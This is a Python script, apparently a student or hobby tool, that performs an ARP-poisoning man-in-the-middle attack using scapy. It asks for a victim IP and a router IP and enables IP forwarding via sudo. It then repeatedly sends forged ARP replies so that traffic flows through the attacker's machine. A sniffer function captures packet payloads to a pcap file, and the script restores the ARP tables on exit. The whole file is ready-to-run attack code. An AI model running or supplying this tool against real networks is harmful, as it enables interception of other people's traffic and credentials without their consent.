#!/usr/bin/env python3
# Authors: Matt Matero & Will Cusick
# Python Version: 3.5.2
from scapy.all import *
import atexit
import sys
import os
import time


def enable_ip_forwarding():
  print("[*] Enabling IP Forwarding...")
  if sys.platform.startswith('linux'):
    result = os.system("sudo sysctl net.ipv4.ip_forward=1")
  elif sys.platform.startswith('darwin'):
    result = os.system("sudo sysctl net.inet.ip.forwarding=1")
  else:
    print("[!] Unsupported platform! Can't enable IP forwarding")
    raise NotImplementedError("Unsupported platform")

  if result > 0:
    print("[!] Error trying to enable IP forwarding")
    print("[!] Received Exit Status " + str(result))
    print("[!] Exiting...")
    # unregister disable_ip_forwarding since we know we didn't do it successfully
    atexit.unregister(disable_ip_forwarding)
    sys.exit(1)


# This will ensure we turn off IP forwarding for all "normal" modes of exiting.
# Including sys.exit(), KeyboardInterrupt, etc.
@atexit.register
def disable_ip_forwarding():
  print("[*] Disabling IP Forwarding...")
  if sys.platform.startswith('linux'):
    os.system("sudo sysctl net.ipv4.ip_forward=0")
  elif sys.platform.startswith('darwin'):
    os.system("sudo sysctl net.inet.ip.forwarding=0")
  else:
    print("[!] Unsupported platform! Can't disable IP forwarding")
    raise NotImplementedError("Unsupported platform")


def get_mac(IP):
  print('Getting MAC addr for: ' + IP)
  conf.verb = 0
  ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=10, iface=interface)

  # keep requesting until we get response
  while len(unans) > 0:
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface)

  for snd, rcv in ans:
    return rcv.sprintf(r"%Ether.src%")


def reARP(gate_mac, victim_mac):
  print("[*] Restoring Targets...")
  send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
  send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)


def trick(gate_mac, victim_mac):
  print(gate_mac)
  print(victim_mac)
  send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst=victim_mac))
  send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst=gate_mac))


def sniffer():
    pkts = sniff(iface=interface, count=1000,
                 prn=lambda x: x.sprintf(" Source: %IP.src% : %Ether.src%, \n"
                                         "%Raw.load% \n\n Reciever: %IP.dst% \n"
                                         "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
    wrpcap("temp.pcap", pkts)


def mitm():
  try:
    victim_mac = get_mac(victim_ip)
    print(victim_mac)
  except Exception as e:
    print(e)
    print("[!] Couldn't Find Victim MAC Address")
    print("[!] Exiting...")
    sys.exit(1)

  try:
    gate_mac = get_mac(gate_ip)
    print(gate_mac)
  except Exception as e:
    print(e)
    print("[!] Couldn't Find Gateway MAC Address")
    print("[!] Exiting...")
    sys.exit(1)

  print("[*] Poisoning Targets...")
  while 1:
    try:
      trick(gate_mac, victim_mac)
      time.sleep(1.5)
      # sniffer()
    except KeyboardInterrupt:
      reARP(gate_mac, victim_mac)
      print("[*] User Requested Shutdown")
      print("[*] Exiting...")
      return


if __name__ == '__main__':
  try:
    interface = input("[*] Enter Desired Interface: ")
    victim_ip = input("[*] Enter Victim IP: ")
    gate_ip = input("[*] Enter Router IP: ")
    enable_ip_forwarding()
    mitm()
  except KeyboardInterrupt:
    print("[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(0)
